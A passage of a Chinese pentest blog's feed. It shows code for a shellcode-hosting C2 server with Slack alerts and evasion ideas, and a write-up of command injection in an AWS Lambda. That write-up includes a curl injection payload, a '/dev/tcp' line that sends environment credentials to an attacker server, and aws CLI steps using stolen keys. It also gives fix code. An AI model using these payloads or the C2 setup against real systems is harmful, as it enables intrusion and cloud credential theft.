punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            robot<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>verify_check</code>是验证请求是否从slack发起的，完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_check</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># https://api.slack.com/authentication/verifying-requests-from-slack</span>            <span class="token comment"># https://slack.dev/python-slack-sdk/oauth/index.html#app-installation-flow</span>            <span class="token comment"># if request.form and request.form['token'] == "":</span>            slack_signing_secret <span class="token operator">=</span> <span class="token string">'secret'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            timestamp <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Request-Timestamp'</span><span class="token punctuation">]</span>            request_body <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token comment"># print("request data &#123;&#125;".format(request.get_data()))</span>            <span class="token comment"># print(request.values)</span>            <span class="token comment"># request_body = urlencode(request.values)</span>            <span class="token comment"># print("request data is &#123;&#125;".format(request_body))</span>            sig_basestring <span class="token operator">=</span> <span class="token string">'v0:'</span> <span class="token operator">+</span> timestamp <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> request_body            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">float</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>            my_signature <span class="token operator">=</span> <span class="token string">'v0='</span> <span class="token operator">+</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>                slack_signing_secret<span class="token punctuation">,</span>                sig_basestring<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                hashlib<span class="token punctuation">.</span>sha256            <span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            slack_signature <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Signature'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span>            <span class="token keyword">if</span> hmac<span class="token punctuation">.</span>compare_digest<span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="shellcode托管伪代码"><a href="#shellcode托管伪代码" class="headerlink" title="shellcode托管伪代码"></a>shellcode托管伪代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/i-am-unreachable'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># 静态分析警告</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> post_validate<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> request_data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span>        method <span class="token operator">=</span> request<span class="token punctuation">.</span>method        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 开关关闭状态</span>        msg_fail<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">,</span> <span class="token string">"服务器托管开关关闭，打开请发送指令: **/boot**"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> not_found<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_str <span class="token operator">=</span> <span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        shell_str <span class="token operator">=</span> <span class="token string">"shell_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">)</span>        encrypt <span class="token operator">=</span> encrypt_shell<span class="token punctuation">(</span>key<span class="token punctuation">,</span> redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>encrypt<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><ol><li>我直接选择IP作为白名单，当IP在白名单，并且shellcode托管开关打开的时候，发送shellcode。深入一点可以使用Machine Key作为判断决策，比如<code>HKLM\SOFTWARE\Microsoft\Cryptography</code>，在木马初次运行的时候发送Key到服务端，之后每次运行的时候都检测是否在服务端的名单里面。</li><li>dll可以使用socket分离shellcode，思路和上面一样。socket服务器的隐藏可以选择AWS的ELB(<del>有点贵</del>)类似的加速服务</li></ol><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://idiotc4t.com/persistence/zhu-ji-te-zheng-bang-ding-mu-ma">主机特征绑定木马</a></li><li><a href="https://github.com/i-saint/scribble/blob/8318bd26adfcb8f26ed8c428e43769d48e75bfbc/MachineGUID.cpp">Github MachineGuid</a></li><li><a href="https://github.com/captainwong/jlib/blob/0b41c6deaa2acaf1642d9b54f6ebd2944f114f13/jlib/win32/DeviceUniqueIdentifier.h">Github DeviceUniqueIdentifier</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;背景需求&quot;&gt;&lt;a href=&quot;#背景需求&quot; class=&quot;headerlink&quot; title=&quot;背景需求&quot;&gt;&lt;/a&gt;背景需求&lt;/h3&gt;&lt;p&gt;不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展&lt;/p&gt;
&lt;h4 id=&quot;考虑这样的场景：&quot;&gt;&lt;a href=&quot;#考虑这样的场景：&quot; class=&quot;headerlink&quot; title=&quot;考虑这样的场景：&quot;&gt;&lt;/a&gt;考虑这样的场景：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;后门被静态分析&lt;/li&gt;
&lt;li&gt;后门被动态分析&lt;/li&gt;
&lt;li&gt;shellcode被提取之后触发&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不带合理参数请求shellcode的URL时候，发起警告&lt;/li&gt;
&lt;li&gt;当木马运行在恶意环境的时候，发起警告&lt;ul&gt;
&lt;li&gt;当木马上线IP不在服务端列表&lt;/li&gt;
&lt;li&gt;当木马上线主机的设备指纹不在服务端列表&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;shellcode托管服务随时可以关闭打开&lt;/li&gt;
&lt;li&gt;shellcode托管服务随时可以新增删除木马上线IP或者设备指纹&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;准备材料&quot;&gt;&lt;a href=&quot;#准备材料&quot; class=&quot;headerlink&quot; title=&quot;准备材料&quot;&gt;&lt;/a&gt;准备材料&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一台VPS：托管shellcode，通知slack机器人&lt;/li&gt;
&lt;li&gt;一个AWS账号隐藏C2（CloudFront）&lt;/li&gt;
&lt;li&gt;Slack：接收通知，使用&lt;code&gt;Slash commands&lt;/code&gt;功能控制shellcode托管服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;托管shellcode流程&quot;&gt;&lt;a href=&quot;#托管shellcode流程&quot; class=&quot;headerlink&quot; title=&quot;托管shellcode流程&quot;&gt;&lt;/a&gt;托管shellcode流程&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;/2021/04/06/defense-from-c2/18.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Lambda远程命令执行测试</title>
    <link href="https://jkme.github.io/2021/04/01/aws-lambda-rce.html"/>
    <id>https://jkme.github.io/2021/04/01/aws-lambda-rce.html</id>
    <published>2021-03-31T16:00:00.000Z</published>
    <updated>2022-01-21T03:41:19.518Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p><h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul><li>Lambda函数代码路径: <code>/var/task</code></li><li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li><li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li><li>默认用户: <code>sbx_userxxx</code></li><li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li><li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li></ul><p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p><p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p><h6 id="配置aws命令行工具"><a href="#配置aws命令行工具" class="headerlink" title="配置aws命令行工具"></a>配置aws命令行工具</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencreds输入获取到的AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY和对应区域，编辑~/.aws/credentials，在配置文件里面增加aws_session_token，设置获取到的对应值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p><h6 id="获取function-name、role-name"><a href="#获取function-name、role-name" class="headerlink" title="获取function name、role name"></a>获取function name、role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ARN(Amazon Resource Name)是AWS里面唯一资源标示符号，ARN的格式取决于特定的资源，一般是这种格式：</p><pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-idarn:partition:service:region:account-id:resource-type&#x2F;resource-idarn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>partition</code>：资源所在分区<ul><li><code>aws</code> - AWS 区域</li><li><code>aws-cn</code> - 中国区域</li><li><code>aws-us-gov</code> - AWS GovCloud (US) 区域</li></ul></li><li><code>service</code>: 标识 AWS 产品的服务命名空间。例如，s3 表示 Amazon S3 资源。</li><li><code>region</code>: 区域。例如，us-east-2 表示 美国东部（俄亥俄州）。</li><li><code>account-id</code>: 拥有资源的 AWS 账户的 ID（不含连字符）。例如，123456789012。</li><li><code>resource-id</code>: 资源标识符。ARN 的这一部分可以是资源的名称或 ID，也可以是资源路径. 例如，<code>user/Bob</code>表示 IAM 用户.</li></ul><p>在Lambda里面，ARN的格式是如下这样的表示：<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p><p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p><h6 id="获取函数的权限明细"><a href="#获取函数的权限明细" class="headerlink" title="获取函数的权限明细"></a>获取函数的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取attach的权限明细"><a href="#获取attach的权限明细" class="headerlink" title="获取attach的权限明细"></a>获取attach的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取policy-name"><a href="#获取policy-name" class="headerlink" title="获取policy name"></a>获取policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取用户凭证的权限明细"><a href="#获取用户凭证的权限明细" class="headerlink" title="获取用户凭证的权限明细"></a>获取用户凭证的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过查询用户凭证的权限明细，就可以根据获取到的凭证操作AWS的资源，比如S3、EC2。这里的用户凭证权限明细不包括attach的权限</p><h6 id="常用的查询"><a href="#常用的查询" class="headerlink" title="常用的查询"></a>常用的查询</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencredsaws ssm describe-instance-information --profile stolencredsaws s3 <span class="token function">ls</span> --profile stolencredsaws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencredsaws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="疑难问题"><a href="#疑难问题" class="headerlink" title="疑难问题"></a>疑难问题</h3><ol><li><p>当确定存在命令执行的时候，先使用了<code>wget</code>，查看<code>cloudwatch</code>之后发现不存在这个命令，当我使用<a href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>测试的时候发现<code>curl</code>都不存在。这时候可以使用<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>来传输数据，先把需要获取到的内容写入到文件，然后外带传输。</p></li><li><p>另外一个隐患是DoW（Denial of Wallet），因为Lambda是按照函数调用次数付费的，所以如果找到一个Lambda的事件触发器，一般是一个http请求，发起大量请求消耗资源, 延伸一下腾讯在推的类似一个业务在github上有很多开源项目 :( 。AWS可以再加一层<code>cloudfront</code>，然后配合<code>cloudwatch</code>或者账单预警来完善，或者添加用户认证token。</p></li><li><p>为什么上面我没有提命令执行之后反弹shell呢？因为一反弹成功之后马上断开。最后在Lambda的配置里面发现Lambda执行的timeout是3s，lambda在建立的时候默认运行时间是3s，可以修改为最大15分钟。</p></li><li><p>还有一种攻击手法，可以修改代码运行环境，没看太懂: <a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">针对AWS Lambda的运行时攻击</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverless安全研究 — Serverless安全风险</a></li><li><a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li><li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li><li><a href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;漏洞&quot;&gt;&lt;a href=&quot;#漏洞&quot; class=&quot;headerlink&quot; title=&quot;漏洞&quot;&gt;&lt;/a&gt;漏洞&lt;/h3&gt;&lt;p&gt;测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;execute_command &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg -i &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; video_url &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -y -f &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; img_format &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -ss &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; time_index &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -vframes 1 &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; WH &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; output_path
&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; shell&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻击的Payload： &lt;code&gt;;curl &amp;lt;your vps&amp;gt;:&amp;lt;port&amp;gt;;&lt;/code&gt;，然后在自己服务器监听可以收到Lambda容器发起的请求。&lt;/p&gt;
&lt;h5 id=&quot;修复代码&quot;&gt;&lt;a href=&quot;#修复代码&quot; class=&quot;headerlink&quot; title=&quot;修复代码:&quot;&gt;&lt;/a&gt;修复代码:&lt;/h5&gt;&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-i&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; video_url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-y&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-f&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; img_format&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-ss&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; time_index&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-vframes&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; output_path&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h3 id=&quot;储备知识&quot;&gt;&lt;a href=&quot;#储备知识&quot; class=&quot;headerlink&quot; title=&quot;储备知识&quot;&gt;&lt;/a&gt;储备知识&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Lambda函数代码路径: &lt;code&gt;/var/task&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;用户凭证: 存储在环境变量里面，&lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;, &lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;, &lt;code&gt;AWS_SESSION_TOKEN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;文件系统: &lt;code&gt;/var/task&lt;/code&gt;只读，&lt;code&gt;/tmp&lt;/code&gt;可写&lt;/li&gt;
